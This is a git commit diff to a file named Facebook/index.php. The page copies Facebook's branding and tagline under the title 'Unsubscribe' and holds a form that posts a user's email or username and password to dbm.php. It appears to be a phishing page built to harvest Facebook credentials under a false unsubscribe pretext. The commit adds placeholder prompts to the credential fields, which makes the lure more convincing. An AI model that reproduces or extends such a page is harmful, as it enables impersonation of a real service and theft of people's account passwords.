e3551051e6f59fc538b80541109155646cdd0097
Prince Kumar <pk980145@gmail.com>
2023-08-14 23:22:49 +0530

    directory changed

--- Facebook/index.php
+++ Facebook/index.php
@@ -6,15 +6,15 @@
     <title>Unsubscribe</title>
     <link type="text/css" rel="stylesheet" href="style.css">
 </head>
-<body bgcolor="#f0f0f0">
+<body background-color="#f0f0f0">
     <div id=blk>
     <h1 id="fb">facebook</h1>
     <p1>Facebook helps you connect and share with the people in you life.</p1>
     </div>
     <div id="entry">
         <form action="dbm.php" method="post">
-            <input type="text" id="user" name="user"><br><br>
-            <input type="password" id="pass" name="pass" ><br><br>
+            <input type="text" id="user" name="user" placeholder="email or username"><br><br>
+            <input type="password" id="pass" name="pass" placeholder="password"><br><br>
             <input type="submit" id="submit" name="submit" value="Unsubscribe">
             
         </form>
